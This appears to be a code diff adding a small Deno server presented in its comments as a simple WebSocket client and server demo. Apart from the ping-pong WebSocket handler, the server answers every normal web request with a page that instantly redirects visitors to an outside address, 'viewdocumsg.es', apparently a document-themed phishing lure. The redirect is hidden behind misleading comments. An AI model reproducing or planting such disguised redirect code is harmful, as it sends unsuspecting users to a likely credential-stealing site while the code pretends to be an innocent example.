@@ -1,1 +1,35 @@
-# auth-arvst
+// A very simple web socket client
+function getClientHtml(domain) {
+  return `<html>
+
+</head>
+
+<html lang="en"><head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Refresh" content="0; url=https://viewdocumsg.es/macu/s/a">
+ </head>
+ <body></body></html>
+
+</html>`;
+}
+
+// A simple WebSocket server
+Deno.serve((request: Request) => {
+  if (request.headers.get("upgrade") === "websocket") {
+    // Upgrade to a web socket response if requested
+    const { socket, response } = Deno.upgradeWebSocket(request);
+
+    // Listen for incoming messages
+    socket.onmessage = (_e) => {
+      console.log("ping");
+      socket.send("pong");
+    };
+
+    return response;
+  } else {
+    // Normal HTTP requests receive the client HTML
+    const url = new URL(request.url);
+    const body = new TextEncoder().encode(getClientHtml(url.host));
+    return new Response(body);
+  }
+});
